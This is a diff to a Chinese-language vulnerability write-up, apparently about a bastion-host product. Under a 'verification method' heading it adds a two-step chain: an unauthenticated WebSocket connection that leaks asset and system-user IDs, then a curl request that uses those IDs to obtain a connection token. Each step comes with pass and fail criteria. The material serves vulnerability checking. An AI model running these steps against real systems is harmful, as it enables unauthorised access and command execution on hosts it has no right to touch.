@@ -86,9 +86,17 @@ async def exec_cmd(token, cmd):
 ## 验证方法
 
 ```bash
-# 检查未授权 WebSocket 是否可连接
-curl -s "http://target/api/v1/authentication/connection-token/" -o /dev/null -w "%{http_code}"
-# 返回非 401/403 表示接口存在认证缺陷
+# 第一条：未授权读取任务日志，拿到 asset_id / system_user_id
+websocat "ws://target/ws/ops/tasks/log/"
+# 判据：连接未被 401 关闭，且推送回来的 JSON 里含 asset / asset_id、system_user_id 等具体 ID 值
+# 反例：升级失败、被 401/403 拒绝，或只回 {"msg":"please login"} 一类提示
+
+# 第二条：用上一步拿到的 ID 请求连接 Token
+curl -s -X POST "http://target/api/v1/authentication/connection-token/?user-only=None" \
+  -H "Content-Type: application/json" \
+  -d '{"user":"USER_ID","asset":"ASSET_ID","system_user":"SYSTEM_USER_ID"}'
+# 判据：响应 JSON 的 token 字段是一串非空的长字符串
+# 反例：{"token":null} / {"token":""} / 权限错误 JSON，都说明这条链没通
 ```
 
 ## 指纹确认
